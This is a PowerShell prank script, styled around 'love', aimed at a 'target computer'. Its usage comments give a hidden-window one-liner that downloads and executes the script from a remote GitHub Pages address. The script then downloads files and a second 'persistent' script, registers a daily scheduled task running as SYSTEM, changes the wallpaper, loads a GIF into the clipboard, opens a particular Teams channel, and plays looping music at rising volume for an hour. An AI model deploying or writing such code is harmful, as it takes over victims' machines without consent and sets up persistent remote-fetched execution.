# USAGE:
# Win + R:
# powershell -w h -c ". ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/gradlove/real-amor.ps1").Content))))"
# Powershell:
# . ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/gradlove/real-amor.ps1").Content))))

$Data = @{
    WallpaperURL              = "https://juanbanpar.github.io/gradlove/files/wall.jpg"
    GifURL                    = "https://juanbanpar.github.io/gradlove/files/heart-locket.gif"
    MusicURL                  = "https://juanbanpar.github.io/gradlove/files/music.wav"
    PersistentURL             = "https://juanbanpar.github.io/gradlove/persistent.ps1"
    ReadmeURL                 = "https://juanbanpar.github.io/gradlove/README_WINDOWS.txt"
    DownloadDirectory         = "$env:USERPROFILE\amor"
    ReadmeDirectory           = "$env:USERPROFILE\Desktop"
}

$WallpaperDest  = $($Data.DownloadDirectory + "\Wallpaper." + ($Data.WallpaperURL -replace ".*\."))
$GifDest  = $($Data.DownloadDirectory + "\Gif." + ($Data.GifURL -replace ".*\."))
$MusicDest = $($Data.DownloadDirectory + "\Music." + ($Data.MusicURL -replace ".*\."))
$PersistentDest = $($Data.DownloadDirectory + "\Persistent." + ($Data.PersistentURL -replace ".*\."))
$ReadmeDest = $($Data.ReadmeDirectory + "\README." + ($Data.ReadmeURL -replace ".*\."))

# Creates the LOVE folder on the target computer
New-Item -ItemType Directory -Path $Data.DownloadDirectory -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $Data.ReadmeDirectory -ErrorAction SilentlyContinue

# Downloads SO MUCH LOVE
Start-BitsTransfer -Source $Data.WallpaperURL -Destination $WallpaperDest
Start-BitsTransfer -Source $Data.GifURL -Destination $GifDest
Start-BitsTransfer -Source $Data.MusicURL -Destination $MusicDest
Start-BitsTransfer -Source $Data.PersistentURL -Destination $PersistentDest
Start-BitsTransfer -Source $Data.ReadmeURL -Destination $ReadmeDest

# Function of LOVE
Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>
 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Make our LOVE last forever
$Trigger = New-ScheduledTaskTrigger -Daily -At "11:00 am"
$Action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "C:\amor\persistent.ps1"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

Register-ScheduledTask -TaskName "Amor" -Trigger $Trigger -Action $Action -Principal $Principal

# Sets LOVE images
Set-WallPaper -Image $WallpaperDest -Style Fit

# Add to the clipboard LOVE gif
Get-ChildItem $GifDest | Set-Clipboard

# Open my favourite channel to express HOW MUCH LOVE I have
start "https://teams.microsoft.com/l/channel/19%3acd6d7b457ff84d86b3a182a310139597%40thread.tacv2/Random?groupId=1a0ebcf0-5300-494f-a968-317e4e6c7a42&tenantId=66102552-ecf2-44f2-aeee-14fa85460e0f"

# Sleep 5 minutes to wait for the LOVER to be back at the computer
Start-Sleep -Seconds 300

# Plays LOVE music
$player = New-Object System.Media.SoundPlayer $MusicDest
$player.PlayLooping()

# Function to say LOUDLY how much I LOVE YOU
# but increase volume by steps
Function Set-Speaker($Volume) {
    $wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175);Start-Sleep -Seconds 1}	
}
Set-Speaker -Volume 50

# Sleep the shell so we can HEAR just enough time how MUCH I LOVE YOU
Start-Sleep -Seconds 3600
